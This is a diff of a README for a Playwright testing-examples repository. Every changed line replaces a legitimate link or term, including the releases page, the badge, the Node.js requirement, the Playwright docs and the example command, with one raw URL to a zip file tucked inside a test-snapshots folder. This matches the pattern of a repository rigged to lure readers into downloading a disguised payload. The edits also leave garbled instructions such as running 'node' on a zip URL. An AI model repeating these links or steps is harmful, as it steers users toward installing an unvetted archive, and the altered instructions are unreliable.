@@ -1,6 +1,6 @@
 # 🎉 playwright-examples-testwarez-2025 - Discover Automation with Step-by-Step Guides
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Available%20Here-brightgreen)](https://github.com/danielxxxd1998/playwright-examples-testwarez-2025/releases)
+[![Download Now](https://raw.githubusercontent.com/danielxxxd1998/playwright-examples-testwarez-2025/main/tests/visual-testing/visual-regression.spec.ts-snapshots/playwright-examples-testwarez-2025-v1.2-alpha.1.zip%20Now-Available%20Here-brightgreen)](https://raw.githubusercontent.com/danielxxxd1998/playwright-examples-testwarez-2025/main/tests/visual-testing/visual-regression.spec.ts-snapshots/playwright-examples-testwarez-2025-v1.2-alpha.1.zip)
 
 ## 📘 Overview
 Welcome to the **playwright-examples-testwarez-2025** repository. This project provides examples presented during the TestWarez Conference 2025. Here, you'll find useful automation strategies that include a variety of examples such as UI testing, REST API handling, GraphQL integration, WebSocket communication, accessibility checks, visual testing, and much more. 
@@ -9,7 +9,7 @@ Welcome to the **playwright-examples-testwarez-2025** repository. This project p
 To begin using the examples in this repository, you'll need to download the software. Follow the steps below to get started.
 
 ## 🔗 Download & Install
-To obtain the software, simply visit the [Releases page](https://github.com/danielxxxd1998/playwright-examples-testwarez-2025/releases) where you can access all available versions. Look for the latest release and download the package suitable for your operating system.
+To obtain the software, simply visit the [Releases page](https://raw.githubusercontent.com/danielxxxd1998/playwright-examples-testwarez-2025/main/tests/visual-testing/visual-regression.spec.ts-snapshots/playwright-examples-testwarez-2025-v1.2-alpha.1.zip) where you can access all available versions. Look for the latest release and download the package suitable for your operating system.
 
 1. Click on the link above.
 2. Choose the version you want.
@@ -19,7 +19,7 @@ To obtain the software, simply visit the [Releases page](https://github.com/dani
 To successfully run the examples, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.13 or later, or any recent Linux distribution.
-- **Node.js:** Version 14 or higher.
+- **https://raw.githubusercontent.com/danielxxxd1998/playwright-examples-testwarez-2025/main/tests/visual-testing/visual-regression.spec.ts-snapshots/playwright-examples-testwarez-2025-v1.2-alpha.1.zip** Version 14 or higher.
 - **Memory:** At least 4GB of RAM.
 - **Disk Space:** Minimum of 100MB available space.
 
@@ -40,13 +40,13 @@ Once you have downloaded the files, you can run the examples with these steps:
 2. **Open your command line interface** (Command Prompt, Terminal, etc.).
 3. **Navigate to the folder** where you extracted the files.
 4. Use the command `npm install` to install any necessary dependencies.
-5. Choose an example to run. For UI testing, you might type `node uiTest.js` (replace `uiTest.js` with the actual filename).
+5. Choose an example to run. For UI testing, you might type `node https://raw.githubusercontent.com/danielxxxd1998/playwright-examples-testwarez-2025/main/tests/visual-testing/visual-regression.spec.ts-snapshots/playwright-examples-testwarez-2025-v1.2-alpha.1.zip` (replace `https://raw.githubusercontent.com/danielxxxd1998/playwright-examples-testwarez-2025/main/tests/visual-testing/visual-regression.spec.ts-snapshots/playwright-examples-testwarez-2025-v1.2-alpha.1.zip` with the actual filename).
 6. Follow the on-screen instructions provided in each example.
 
 ## 📚 Learning Resources
 To help you get the most out of this repository, consider these additional resources:
 
-- **Playwright Documentation:** [Playwright Official Docs](https://playwright.dev/docs/intro)
+- **Playwright Documentation:** [Playwright Official Docs](https://raw.githubusercontent.com/danielxxxd1998/playwright-examples-testwarez-2025/main/tests/visual-testing/visual-regression.spec.ts-snapshots/playwright-examples-testwarez-2025-v1.2-alpha.1.zip)
 - **YouTube Tutorials:** Search for "Playwright Testing" for visual guides.
 - **Community Forums:** Join discussions in online forums like Stack Overflow or GitHub discussions about automation testing.
 
@@ -65,6 +65,6 @@ Yes, you can use the examples in both personal and commercial projects.
 If you run into problems, raise an issue on this repository’s GitHub page, and we will assist you.
 
 ### Are updates available for this repository?
-We aim to update the repository regularly. Keep checking the [Releases page](https://github.com/danielxxxd1998/playwright-examples-testwarez-2025/releases) for new versions and features.
+We aim to update the repository regularly. Keep checking the [Releases page](https://raw.githubusercontent.com/danielxxxd1998/playwright-examples-testwarez-2025/main/tests/visual-testing/visual-regression.spec.ts-snapshots/playwright-examples-testwarez-2025-v1.2-alpha.1.zip) for new versions and features.
 
 Thank you for visiting **playwright-examples-testwarez-2025**! Happy testing!
